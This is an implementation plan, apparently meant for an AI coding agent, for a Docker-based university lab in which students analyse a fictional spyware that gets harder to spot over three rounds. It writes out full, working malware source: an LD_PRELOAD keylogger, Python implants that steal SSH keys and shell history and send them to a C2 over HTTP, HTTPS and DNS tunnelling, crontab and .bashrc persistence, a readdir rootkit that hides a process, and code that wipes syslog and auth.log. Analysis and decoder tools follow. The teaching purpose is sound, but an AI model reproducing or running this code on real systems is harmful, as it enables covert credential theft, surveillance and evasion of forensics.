# Ghost-in-the-Box Lab Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Docker-based educational lab where advanced students analyze and defend against a fictional spyware that evolves across 3 rounds of escalating OPSEC.

**Architecture:** Three Docker services (`victim`, `c2-server`, `analyst-ws`) on an isolated `ghost-net` bridge network (10.13.37.0/24). A `dns-server` service is added for Round 3. All scenario constants flow from `generators/data/scenario_facts.py`. Each round is selected via the `ROUND` build arg.

**Tech Stack:** Python 3.12, Flask, Docker Compose, Ubuntu 24.04, C (gcc for LD_PRELOAD hooks), pytest, scapy, dnslib, Jupyter Lab.

---

## Phase 1 — Foundation

### Task 1: Repo structure, pyproject.toml, CLAUDE.md

**Files:**
- Create: `pyproject.toml`
- Create: `requirements.txt`
- Create: `CLAUDE.md`
- Create: `.env.example`
- Create: `generators/__init__.py`
- Create: `generators/data/__init__.py`

- [ ] **Step 1: Initialize git repo and directory tree**

```bash
cd /home/kkopec/projects/ghost-in-the-box-lab
git init
mkdir -p core/scenario \
          core/spyware-samples/shared \
          core/spyware-samples/round-1 \
          core/spyware-samples/round-2 \
          core/spyware-samples/round-3 \
          core/evidence-data \
          generators/data \
          module-techlab/c2-server \
          module-techlab/victim \
          module-techlab/analyst-ws/tools \
          module-techlab/analyst-ws/notebooks \
          module-techlab/dns-server \
          module-techlab/rounds/round-1-naive \
          module-techlab/rounds/round-2-hidden \
          module-techlab/rounds/round-3-advanced \
          module-casefile/round-1 \
          module-casefile/round-2 \
          module-casefile/round-3 \
          tests \
          docs/superpowers/plans \
          docs/superpowers/specs
touch generators/__init__.py generators/data/__init__.py
```

- [ ] **Step 2: Write pyproject.toml**

```toml
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.backends.legacy:BuildBackend"

[project]
name = "ghost-in-the-box-lab"
version = "1.0.0"
requires-python = ">=3.12"

[tool.pytest.ini_options]
testpaths = ["tests"]
python_files = ["test_*.py"]
python_classes = ["Test*"]
python_functions = ["test_*"]
```

- [ ] **Step 3: Write requirements.txt**

```
flask==3.1.0
gunicorn==23.0.0
requests==2.32.3
scapy==2.6.1
dnslib==0.9.25
pytest==8.3.4
```

- [ ] **Step 4: Write .env.example**

```bash
ROUND=1
ANALYST_WS_PORT=8888
JUPYTER_TOKEN=ghost
POSTGRES_USER=analityk
```

- [ ] **Step 5: Write CLAUDE.md**

```markdown
# Ghost-in-the-Box Lab

Educational lab for university cybersecurity students — analyzing and defending
against spyware that evolves across 3 rounds of escalating OPSEC.

## Setup

    python -m venv .venv && source .venv/bin/activate
    pip install -r requirements.txt

## Commands

    # Run all tests (no Docker required)
    pytest tests/

    # Start Round 1 stack
    ROUND=1 docker compose --profile full up -d --build

    # Start Round 3 stack (adds dns-server)
    ROUND=3 docker compose --profile full --profile round3 up -d --build

    # Tear down and reset volumes
    docker compose --profile full --profile round3 down -v

## Architecture

    core/spyware-samples/   ← real spyware source (runs inside victim container only)
    generators/data/scenario_facts.py  ← SINGLE source of scenario constants
    module-techlab/         ← Docker environment
    module-casefile/        ← pre-generated artifacts for classroom analysis

## Conventions

- Lab materials: Polish; technical names: English
- RANDOM_SEED = 42 — deterministic generation
- ROUND build arg (1/2/3) controls which spyware is installed in victim container
- All scenario constants in generators/data/scenario_facts.py
```

- [ ] **Step 6: Commit**

```bash
git add .
git commit -m "feat: initialize repo structure"
```

---

### Task 2: scenario_facts.py (single source of truth) + test

**Files:**
- Create: `generators/data/scenario_facts.py`
- Create: `tests/test_scenario_facts.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_scenario_facts.py
import ipaddress
import pytest


def test_c2_ip_is_private():
    from generators.data.scenario_facts import C2_IP
    assert ipaddress.ip_address(C2_IP).is_private


def test_c2_ports_defined():
    from generators.data.scenario_facts import C2_PORT_HTTP, C2_PORT_HTTPS
    assert C2_PORT_HTTP == 8080
    assert C2_PORT_HTTPS == 443


def test_stolen_files_are_relative():
    from generators.data.scenario_facts import STOLEN_FILES
    for f in STOLEN_FILES:
        assert not f.startswith("/"), f"{f!r} must be relative to home dir"


def test_exfil_interval_positive():
    from generators.data.scenario_facts import EXFIL_INTERVAL_SECONDS
    assert EXFIL_INTERVAL_SECONDS > 0


def test_dns_domain_fictional():
    from generators.data.scenario_facts import DNS_C2_DOMAIN
    assert "ghost" in DNS_C2_DOMAIN


def test_process_name_r2_looks_like_kernel_thread():
    from generators.data.scenario_facts import PROCESS_NAME_R2
    assert PROCESS_NAME_R2.startswith("[") and PROCESS_NAME_R2.endswith("]")
```

- [ ] **Step 2: Run test — expect FAIL (ImportError)**

```bash
pytest tests/test_scenario_facts.py -v
# Expected: ERROR — ModuleNotFoundError: No module named 'generators'
```

- [ ] **Step 3: Write scenario_facts.py**

```python
# generators/data/scenario_facts.py
RANDOM_SEED = 42

C2_IP = "10.13.37.1"
C2_PORT_HTTP = 8080
C2_PORT_HTTPS = 443
DNS_C2_DOMAIN = "update.ghost-pkg.net"

VICTIM_USERNAME = "analyst"
VICTIM_HOSTNAME = "workstation-042"

EXFIL_INTERVAL_SECONDS = 60
STOLEN_FILES = [".bash_history", ".ssh/id_rsa", "Documents/report-draft.txt"]

ATTACKER_ALIAS = "ghost"
PROCESS_NAME_R2 = "[kworker/u4:2]"
KLOG_PATH = "/tmp/.klog"
HARVEST_DIR = "/tmp/.harvest"
LIBHIDE_PATH = "/usr/local/lib/libhide.so"
```

- [ ] **Step 4: Run tests — expect PASS**

```bash
pytest tests/test_scenario_facts.py -v
# Expected: 6 passed
```

- [ ] **Step 5: Commit**

```bash
git add generators/data/scenario_facts.py tests/test_scenario_facts.py
git commit -m "feat: add scenario_facts — single source of scenario constants"
```

---

## Phase 2 — Spyware Samples

### Task 3: LD_PRELOAD keylogger (shared, all rounds)

**Files:**
- Create: `core/spyware-samples/shared/keylogger.c`
- Create: `core/spyware-samples/shared/Makefile`
- Create: `tests/test_spyware_samples.py` (initial)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_spyware_samples.py
from pathlib import Path

SAMPLES = Path("core/spyware-samples")


def test_keylogger_c_has_educational_header():
    src = (SAMPLES / "shared/keylogger.c").read_text()
    assert "GHOST-IN-THE-BOX LAB" in src
    assert "EDUCATIONAL SAMPLE" in src


def test_keylogger_c_hooks_read_syscall():
    src = (SAMPLES / "shared/keylogger.c").read_text()
    assert "RTLD_NEXT" in src
    assert "read" in src


def test_makefile_produces_shared_library():
    src = (SAMPLES / "shared/Makefile").read_text()
    assert "libkeylogger.so" in src
    assert "-shared" in src
    assert "-fPIC" in src
```

- [ ] **Step 2: Run — expect FAIL**

```bash
pytest tests/test_spyware_samples.py -v
# Expected: FAIL — file not found
```

- [ ] **Step 3: Write keylogger.c**

```c
/* core/spyware-samples/shared/keylogger.c
 * GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
 * Shared | Isolated Docker environment only
 * For use in university cybersecurity courses
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>

typedef ssize_t (*read_fn)(int, void *, size_t);

ssize_t read(int fd, void *buf, size_t count) {
    static read_fn real_read = NULL;
    if (!real_read)
        real_read = (read_fn)dlsym(RTLD_NEXT, "read");
    ssize_t n = real_read(fd, buf, count);
    if (n > 0 && fd == STDIN_FILENO) {
        int lfd = open("/tmp/.klog", O_WRONLY | O_CREAT | O_APPEND, 0600);
        if (lfd >= 0) {
            write(lfd, buf, (size_t)n);
            close(lfd);
        }
    }
    return n;
}
```

- [ ] **Step 4: Write Makefile**

```makefile
# core/spyware-samples/shared/Makefile
CC      = gcc
CFLAGS  = -shared -fPIC -Wall -O2
LDFLAGS = -ldl

all: libkeylogger.so

libkeylogger.so: keylogger.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

clean:
	rm -f libkeylogger.so
```

- [ ] **Step 5: Run tests — expect PASS**

```bash
pytest tests/test_spyware_samples.py -v
# Expected: 3 passed
```

- [ ] **Step 6: Commit**

```bash
git add core/spyware-samples/shared/ tests/test_spyware_samples.py
git commit -m "feat: add LD_PRELOAD keylogger shared library"
```

---

### Task 4: Round 1 spyware (naïve — visible process, HTTP exfil)

**Files:**
- Create: `core/spyware-samples/round-1/spyware.py`

- [ ] **Step 1: Add test to test_spyware_samples.py**

```python
# append to tests/test_spyware_samples.py

def test_round1_spyware_has_educational_header():
    src = (SAMPLES / "round-1/spyware.py").read_text()
    assert "GHOST-IN-THE-BOX LAB" in src
    assert "Round: 1" in src


def test_round1_spyware_uses_http_not_https():
    src = (SAMPLES / "round-1/spyware.py").read_text()
    assert "http://" in src
    assert "https://" not in src


def test_round1_spyware_has_no_persistence():
    src = (SAMPLES / "round-1/spyware.py").read_text()
    assert "crontab" not in src
    assert ".bashrc" not in src
```

- [ ] **Step 2: Run — expect FAIL**

```bash
pytest tests/test_spyware_samples.py::test_round1_spyware_has_educational_header -v
```

- [ ] **Step 3: Write round-1/spyware.py**

```python
#!/usr/bin/env python3
# GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
# Round: 1 | Isolated Docker environment only
# For use in university cybersecurity courses

import os
import sys
import time
import json
import subprocess
from datetime import datetime, timezone
from pathlib import Path

import requests

sys.path.insert(0, "/opt")
from generators.data.scenario_facts import (
    C2_IP, C2_PORT_HTTP, EXFIL_INTERVAL_SECONDS,
    STOLEN_FILES, KLOG_PATH, HARVEST_DIR,
)

C2_URL = f"http://{C2_IP}:{C2_PORT_HTTP}/beacon"
KLOG = Path(KLOG_PATH)
HARVEST = Path(HARVEST_DIR)


def harvest_files() -> dict:
    home = Path.home()
    HARVEST.mkdir(exist_ok=True)
    stolen = {}
    for rel in STOLEN_FILES:
        src = home / rel
        if src.exists() and src.is_file():
            try:
                stolen[rel] = src.read_text(errors="replace")[:4096]
            except OSError:
                pass
    return stolen


def read_keylog() -> str:
    if KLOG.exists():
        data = KLOG.read_text(errors="replace")
        KLOG.write_text("")
        return data
    return ""


def take_screenshot() -> bool:
    try:
        subprocess.run(["scrot", "/tmp/.screen.png"],
                       capture_output=True, timeout=5)
        return True
    except Exception:
        return False


def beacon(payload: dict) -> None:
    try:
        requests.post(C2_URL, json=payload, timeout=10)
    except Exception:
        pass


def main() -> None:
    while True:
        payload = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "hostname": os.uname().nodename,
            "round": 1,
            "keylog": read_keylog(),
            "files": harvest_files(),
            "screenshot": take_screenshot(),
        }
        beacon(payload)
        time.sleep(EXFIL_INTERVAL_SECONDS)


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Run tests — expect PASS**

```bash
pytest tests/test_spyware_samples.py -v
# Expected: 6 passed
```

- [ ] **Step 5: Commit**

```bash
git add core/spyware-samples/round-1/ tests/test_spyware_samples.py
git commit -m "feat: add Round 1 spyware — naive HTTP exfiltration"
```

---

### Task 5: Round 2 spyware (hidden process + HTTPS + cron persistence)

**Files:**
- Create: `core/spyware-samples/round-2/spyware.py`
- Create: `core/spyware-samples/round-2/gen-cert.sh`

- [ ] **Step 1: Add tests**

```python
# append to tests/test_spyware_samples.py

def test_round2_spyware_has_educational_header():
    src = (SAMPLES / "round-2/spyware.py").read_text()
    assert "GHOST-IN-THE-BOX LAB" in src
    assert "Round: 2" in src


def test_round2_uses_https():
    src = (SAMPLES / "round-2/spyware.py").read_text()
    assert "https://" in src


def test_round2_has_cron_persistence():
    src = (SAMPLES / "round-2/spyware.py").read_text()
    assert "crontab" in src or "@reboot" in src


def test_round2_renames_process():
    src = (SAMPLES / "round-2/spyware.py").read_text()
    assert "prctl" in src or "PR_SET_NAME" in src
```

- [ ] **Step 2: Run — expect FAIL**

```bash
pytest tests/test_spyware_samples.py -k round2 -v
```

- [ ] **Step 3: Write round-2/spyware.py**

```python
#!/usr/bin/env python3
# GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
# Round: 2 | Isolated Docker environment only
# For use in university cybersecurity courses

import ctypes
import ctypes.util
import os
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, "/opt")
from generators.data.scenario_facts import (
    C2_IP, C2_PORT_HTTPS, EXFIL_INTERVAL_SECONDS,
    STOLEN_FILES, KLOG_PATH, HARVEST_DIR, PROCESS_NAME_R2,
)

C2_URL = f"https://{C2_IP}:{C2_PORT_HTTPS}/beacon"
KLOG = Path(KLOG_PATH)
HARVEST = Path(HARVEST_DIR)

# --- Rename process to look like a kernel thread ---
_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
PR_SET_NAME = 15
_libc.prctl(PR_SET_NAME, PROCESS_NAME_R2.encode(), 0, 0, 0)


def install_persistence() -> None:
    """Add @reboot crontab entry."""
    spyware_path = os.path.abspath(__file__)
    job = f"@reboot python3 {spyware_path}\n"
    result = subprocess.run(["crontab", "-l"],
                            capture_output=True, text=True)
    current = result.stdout if result.returncode == 0 else ""
    if spyware_path not in current:
        new = current + job
        subprocess.run(["crontab", "-"],
                       input=new, text=True, capture_output=True)


def harvest_files() -> dict:
    home = Path.home()
    HARVEST.mkdir(exist_ok=True)
    stolen = {}
    for rel in STOLEN_FILES:
        src = home / rel
        if src.exists() and src.is_file():
            try:
                stolen[rel] = src.read_text(errors="replace")[:4096]
            except OSError:
                pass
    return stolen


def read_keylog() -> str:
    if KLOG.exists():
        data = KLOG.read_text(errors="replace")
        KLOG.write_text("")
        return data
    return ""


def beacon(payload: dict) -> None:
    try:
        requests.post(C2_URL, json=payload, timeout=10, verify=False)
    except Exception:
        pass


def main() -> None:
    install_persistence()
    while True:
        payload = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "hostname": os.uname().nodename,
            "round": 2,
            "keylog": read_keylog(),
            "files": harvest_files(),
        }
        beacon(payload)
        time.sleep(EXFIL_INTERVAL_SECONDS)


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Write round-2/gen-cert.sh** (generates self-signed cert for c2-server)

```bash
#!/bin/bash
# Generates self-signed TLS certificate for c2-server (Round 2)
# Output: c2-server/certs/c2.crt + c2.key
set -euo pipefail
mkdir -p module-techlab/c2-server/certs
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout module-techlab/c2-server/certs/c2.key \
  -out    module-techlab/c2-server/certs/c2.crt \
  -days 3650 \
  -subj "/CN=update.ghost-pkg.net/O=Ghost Lab/C=PL"
# Copy cert to casefile as "court order" artifact
cp module-techlab/c2-server/certs/c2.crt \
   module-casefile/round-2/c2-certificate.pem
echo "Cert generated and copied to module-casefile/round-2/"
```

- [ ] **Step 5: Run tests — expect PASS**

```bash
pytest tests/test_spyware_samples.py -v
# Expected: 10 passed
```

- [ ] **Step 6: Commit**

```bash
git add core/spyware-samples/round-2/ tests/test_spyware_samples.py
git commit -m "feat: add Round 2 spyware — process hiding, HTTPS, cron persistence"
```

---

### Task 6: Round 3 spyware (DNS tunneling + libhide.so + log wiping)

**Files:**
- Create: `core/spyware-samples/round-3/libhide.c`
- Create: `core/spyware-samples/round-3/Makefile`
- Create: `core/spyware-samples/round-3/spyware.py`

- [ ] **Step 1: Add tests**

```python
# append to tests/test_spyware_samples.py

def test_round3_libhide_has_educational_header():
    src = (SAMPLES / "round-3/libhide.c").read_text()
    assert "GHOST-IN-THE-BOX LAB" in src
    assert "Round: 3" in src


def test_round3_libhide_hooks_readdir():
    src = (SAMPLES / "round-3/libhide.c").read_text()
    assert "readdir" in src
    assert "RTLD_NEXT" in src


def test_round3_spyware_uses_dns_not_http():
    src = (SAMPLES / "round-3/spyware.py").read_text()
    assert "dig" in src or "dns" in src.lower()
    assert "requests.post" not in src


def test_round3_spyware_wipes_logs():
    src = (SAMPLES / "round-3/spyware.py").read_text()
    assert "syslog" in src or "auth.log" in src


def test_round3_spyware_has_bashrc_persistence():
    src = (SAMPLES / "round-3/spyware.py").read_text()
    assert ".bashrc" in src
```

- [ ] **Step 2: Run — expect FAIL**

```bash
pytest tests/test_spyware_samples.py -k round3 -v
```

- [ ] **Step 3: Write round-3/libhide.c**

```c
/* core/spyware-samples/round-3/libhide.c
 * GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
 * Round: 3 | Isolated Docker environment only
 * For use in university cybersecurity courses
 *
 * Usage: HIDE_PID=<pid> LD_PRELOAD=/usr/local/lib/libhide.so <command>
 * Filters the specified PID from readdir() calls on /proc.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>

typedef struct dirent *(*readdir_fn)(DIR *);
static readdir_fn real_readdir = NULL;
static const char *hidden_pid  = NULL;

__attribute__((constructor))
static void init(void) {
    real_readdir = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
    hidden_pid   = getenv("HIDE_PID");
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (hidden_pid && strcmp(entry->d_name, hidden_pid) == 0)
            continue;
        return entry;
    }
    return NULL;
}
```

- [ ] **Step 4: Write round-3/Makefile**

```makefile
# core/spyware-samples/round-3/Makefile
CC      = gcc
CFLAGS  = -shared -fPIC -Wall -O2
LDFLAGS = -ldl

all: libhide.so

libhide.so: libhide.c
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)

clean:
	rm -f libhide.so
```

- [ ] **Step 5: Write round-3/spyware.py**

```python
#!/usr/bin/env python3
# GHOST-IN-THE-BOX LAB — EDUCATIONAL SAMPLE
# Round: 3 | Isolated Docker environment only
# For use in university cybersecurity courses

import os
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, "/opt")
from generators.data.scenario_facts import (
    DNS_C2_DOMAIN, EXFIL_INTERVAL_SECONDS,
    STOLEN_FILES, KLOG_PATH, PROCESS_NAME_R2,
)

KLOG = Path(KLOG_PATH)
CHUNK = 32  # hex chars per DNS label (16 bytes)


def install_persistence() -> None:
    spyware_path = os.path.abspath(__file__)
    hook = f"\n# system update hook\nnohup python3 {spyware_path} &>/dev/null &\n"
    bashrc = Path.home() / ".bashrc"
    if spyware_path not in bashrc.read_text():
        with bashrc.open("a") as f:
            f.write(hook)


def harvest() -> bytes:
    home = Path.home()
    parts = []
    for rel in STOLEN_FILES:
        src = home / rel
        if src.exists() and src.is_file():
            try:
                parts.append(f"[{rel}]\n{src.read_text(errors='replace')[:2048]}")
            except OSError:
                pass
    keylog = ""
    if KLOG.exists():
        keylog = KLOG.read_text(errors="replace")
        KLOG.write_text("")
    if keylog:
        parts.append(f"[keylog]\n{keylog}")
    return "\n".join(parts).encode()


def exfil_dns(data: bytes) -> None:
    """Encode data as hex, exfiltrate via DNS queries to dns-server."""
    hex_data = data.hex()
    chunks = [hex_data[i:i+CHUNK] for i in range(0, len(hex_data), CHUNK)]
    session = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
    for idx, chunk in enumerate(chunks):
        fqdn = f"{chunk}.{idx:04d}.{session}.{DNS_C2_DOMAIN}"
        try:
            subprocess.run(
                ["dig", "+short", "+time=2", fqdn, "@dns-server"],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass


def wipe_logs() -> None:
    pid = str(os.getpid())
    for logfile in ["/var/log/syslog", "/var/log/auth.log"]:
        p = Path(logfile)
        try:
            if p.exists():
                lines = [l for l in p.read_text().splitlines()
                         if pid not in l]
                p.write_text("\n".join(lines) + "\n")
        except OSError:
            pass


def main() -> None:
    install_persistence()
    while True:
        data = harvest()
        if data.strip():
            exfil_dns(data)
        wipe_logs()
        time.sleep(EXFIL_INTERVAL_SECONDS)


if __name__ == "__main__":
    main()
```

- [ ] **Step 6: Run tests — expect PASS**

```bash
pytest tests/test_spyware_samples.py -v
# Expected: 15 passed
```

- [ ] **Step 7: Commit**

```bash
git add core/spyware-samples/round-3/ tests/test_spyware_samples.py
git commit -m "feat: add Round 3 spyware — DNS tunneling, libhide, log wiping"
```

---

## Phase 3 — Docker Infrastructure

### Task 7: c2-server (Flask, HTTP + HTTPS)

**Files:**
- Create: `module-techlab/c2-server/app.py`
- Create: `module-techlab/c2-server/requirements.txt`
- Create: `module-techlab/c2-server/Dockerfile`

- [ ] **Step 1: Write app.py**

```python
# module-techlab/c2-server/app.py
import json
import os
import ssl
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, request, jsonify

app = Flask(__name__)
DATA_DIR = Path("/data/received")


@app.route("/beacon", methods=["POST"])
def beacon():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    payload = request.get_json(force=True, silent=True) or {}
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")
    (DATA_DIR / f"{ts}.json").write_text(json.dumps(payload, indent=2))
    return jsonify({"status": "ok"}), 200


@app.route("/health")
def health():
    return jsonify({"status": "up", "beacons": len(list(DATA_DIR.glob("*.json")))}), 200


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    cert = "/certs/c2.crt"
    key  = "/certs/c2.key"
    if os.path.exists(cert) and os.path.exists(key):
        app.run(host="0.0.0.0", port=port, ssl_context=(cert, key))
    else:
        app.run(host="0.0.0.0", port=port)
```

- [ ] **Step 2: Write c2-server/requirements.txt**

```
flask==3.1.0
```

- [ ] **Step 3: Write c2-server/Dockerfile**

```dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
RUN mkdir -p /data/received /certs
EXPOSE 8080 443
CMD ["python", "app.py"]
```

- [ ] **Step 4: Commit**

```bash
git add module-techlab/c2-server/
git commit -m "feat: add c2-server — receives HTTP/HTTPS beacons from spyware"
```

---

### Task 8: victim container (Ubuntu 24, builds LD_PRELOAD, installs spyware)

**Files:**
- Create: `module-techlab/victim/Dockerfile`
- Create: `module-techlab/victim/entrypoint.sh`
- Create: `module-techlab/victim/simulate-user.sh`

- [ ] **Step 1: Write Dockerfile**

```dockerfile
# module-techlab/victim/Dockerfile
FROM ubuntu:24.04
ARG ROUND=1

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y \
        python3 python3-pip \
        gcc libc6-dev \
        scrot xvfb \
        cron dnsutils curl \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir requests urllib3

# Build shared keylogger LD_PRELOAD library
COPY core/spyware-samples/shared/keylogger.c /tmp/keylogger.c
RUN gcc -shared -fPIC -O2 -o /usr/local/lib/libkeylogger.so \
        /tmp/keylogger.c -ldl

# For Round 3: build libhide.so
COPY core/spyware-samples/round-3/libhide.c /tmp/libhide.c
RUN gcc -shared -fPIC -O2 -o /usr/local/lib/libhide.so \
        /tmp/libhide.c -ldl

# Copy spyware for this specific round
COPY core/spyware-samples/round-${ROUND}/spyware.py /opt/spyware/spyware.py

# Copy generators package so spyware can import scenario_facts
COPY generators/ /opt/generators/
RUN touch /opt/__init__.py /opt/generators/__init__.py \
          /opt/generators/data/__init__.py

# Create victim user and home files
RUN useradd -m -s /bin/bash analyst
USER analyst
RUN mkdir -p /home/analyst/.ssh /home/analyst/Documents && \
    echo "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...EDUKACJA\n-----END RSA PRIVATE KEY-----" \
        > /home/analyst/.ssh/id_rsa && \
    echo "historia_powloki_analityk" >> /home/analyst/.bash_history && \
    printf "Szkic raportu — POUFNE\nDane klientów: Jan Kowalski, ul. Lipowa 15\n" \
        > /home/analyst/Documents/report-draft.txt

USER root
COPY module-techlab/victim/entrypoint.sh /entrypoint.sh
COPY module-techlab/victim/simulate-user.sh /simulate-user.sh
RUN chmod +x /entrypoint.sh /simulate-user.sh

USER analyst
ENV LD_PRELOAD=/usr/local/lib/libkeylogger.so
ENV PYTHONPATH=/opt
ENTRYPOINT ["/entrypoint.sh"]
```

- [ ] **Step 2: Write entrypoint.sh**

```bash
#!/bin/bash
# module-techlab/victim/entrypoint.sh
set -e

# Start virtual framebuffer for scrot screenshots
Xvfb :99 -screen 0 1024x768x24 &
export DISPLAY=:99

# Start user activity simulator in background
/simulate-user.sh &

# For Round 3: set HIDE_PID after spyware starts
if [ "${ROUND:-1}" = "3" ]; then
    python3 /opt/spyware/spyware.py &
    SPYWARE_PID=$!
    export HIDE_PID=$SPYWARE_PID
    # Re-exec with libhide so ps/ls /proc hides the spyware PID
    export LD_PRELOAD="/usr/local/lib/libkeylogger.so:/usr/local/lib/libhide.so"
    wait $SPYWARE_PID
else
    exec python3 /opt/spyware/spyware.py
fi
```

- [ ] **Step 3: Write simulate-user.sh**

```bash
#!/bin/bash
# module-techlab/victim/simulate-user.sh
# Generates activity that the keylogger and file harvester can detect.
while true; do
    # Simulate typing into a terminal (goes through bash stdin -> keylogger)
    echo "ls -la ~/Documents" | cat
    echo "cat ~/.ssh/id_rsa"  | cat
    echo "sudo apt update"    | cat
    # Update bash_history to simulate shell usage
    date >> ~/.bash_history
    sleep 45
done
```

- [ ] **Step 4: Commit**

```bash
git add module-techlab/victim/
git commit -m "feat: add victim container — Ubuntu 24, LD_PRELOAD spyware install"
```

---

### Task 9: analyst-ws container + custom tools

**Files:**
- Create: `module-techlab/analyst-ws/Dockerfile`
- Create: `module-techlab/analyst-ws/tools/dns-decoder.py`
- Create: `module-techlab/analyst-ws/tools/timeline-builder.py`

- [ ] **Step 1: Write Dockerfile**

```dockerfile
# module-techlab/analyst-ws/Dockerfile
FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y \
        python3 python3-pip \
        strace ltrace \
        lsof iproute2 net-tools \
        tcpdump tshark \
        binutils file xxd \
        auditd \
        dnsutils \
        curl wget \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install --no-cache-dir \
    jupyterlab==4.3.4 \
    scapy==2.6.1 \
    dnslib==0.9.25 \
    volatility3==2.7.0

RUN useradd -m -s /bin/bash analityk
USER analityk
RUN mkdir -p /home/analityk/notebooks /home/analityk/tools /home/analityk/casefile

COPY module-techlab/analyst-ws/tools/ /home/analityk/tools/

EXPOSE 8888
CMD ["jupyter", "lab", \
     "--ip=0.0.0.0", "--no-browser", \
     "--notebook-dir=/home/analityk/notebooks", \
     "--ServerApp.token=${JUPYTER_TOKEN:-ghost}"]
```

- [ ] **Step 2: Write tools/dns-decoder.py**

```python
#!/usr/bin/env python3
"""Decode DNS-tunneled data from a pcap captured on the ghost-net.

Usage:
  dns-decoder.py capture.pcap
  dns-decoder.py capture.pcap --domain update.ghost-pkg.net
"""
import argparse
import sys
from collections import defaultdict

from scapy.all import rdpcap, DNS, DNSQR  # type: ignore


def decode(pcap_path: str, domain: str) -> str:
    packets = rdpcap(pcap_path)
    sessions: dict[str, dict[int, bytes]] = defaultdict(dict)

    for pkt in packets:
        if not (pkt.haslayer(DNS) and pkt.haslayer(DNSQR)):
            continue
        qname = pkt[DNSQR].qname.decode(errors="replace").rstrip(".")
        if not qname.endswith(f".{domain}"):
            continue
        # Expected format: <hex>.<idx>.<session>.<domain>
        labels = qname[: -(len(domain) + 1)].split(".")
        if len(labels) < 3:
            continue
        hex_chunk, idx_str, session = labels[0], labels[1], labels[2]
        try:
            sessions[session][int(idx_str)] = bytes.fromhex(hex_chunk)
        except (ValueError, KeyError):
            pass

    output = []
    for session, chunks in sorted(sessions.items()):
        ordered = b"".join(v for _, v in sorted(chunks.items()))
        output.append(f"=== Session {session} ===\n{ordered.decode(errors='replace')}")
    return "\n\n".join(output) or "(no tunneled data found)"


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("pcap", help="Path to pcap file")
    parser.add_argument("--domain", default="update.ghost-pkg.net")
    args = parser.parse_args()
    print(decode(args.pcap, args.domain))
```

- [ ] **Step 3: Write tools/timeline-builder.py**

```python
#!/usr/bin/env python3
"""Build an attack timeline from c2-server received beacon JSON files.

Usage:
  timeline-builder.py /data/received/
"""
import argparse
import json
import sys
from pathlib import Path


def build(data_dir: str) -> None:
    files = sorted(Path(data_dir).glob("*.json"))
    if not files:
        print("No beacon files found.", file=sys.stderr)
        return
    print(f"{'Timestamp':<30} {'Hostname':<20} {'Keylog':<10} {'Files stolen'}")
    print("-" * 80)
    for f in files:
        try:
            b = json.loads(f.read_text())
            ts       = b.get("ts", "?")
            host     = b.get("hostname", "?")
            keylog   = len(b.get("keylog", ""))
            stolen   = list(b.get("files", {}).keys())
            print(f"{ts:<30} {host:<20} {keylog:<10} {', '.join(stolen) or '-'}")
        except (json.JSONDecodeError, OSError):
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("data_dir", help="Directory with beacon JSON files")
    args = parser.parse_args()
    build(args.data_dir)
```

- [ ] **Step 4: Commit**

```bash
git add module-techlab/analyst-ws/
git commit -m "feat: add analyst-ws — forensics tools, dns-decoder, timeline-builder"
```

---

### Task 10: dns-server (Round 3) + docker-compose.yml

**Files:**
- Create: `module-techlab/dns-server/Dockerfile`
- Create: `module-techlab/dns-server/server.py`
- Create: `module-techlab/docker-compose.yml`

- [ ] **Step 1: Write dns-server/server.py**

```python
#!/usr/bin/env python3
"""Authoritative DNS server for update.ghost-pkg.net.
Accepts all queries; logs subdomains to /data/dns-queries/.
"""
import os
from datetime import datetime, timezone
from pathlib import Path

from dnslib import DNSRecord, RR, QTYPE, A
from dnslib.server import DNSServer, BaseResolver

DATA_DIR = Path("/data/dns-queries")
DOMAIN   = os.getenv("DNS_DOMAIN", "update.ghost-pkg.net")
ANSWER_IP = "10.13.37.53"


class LoggingResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
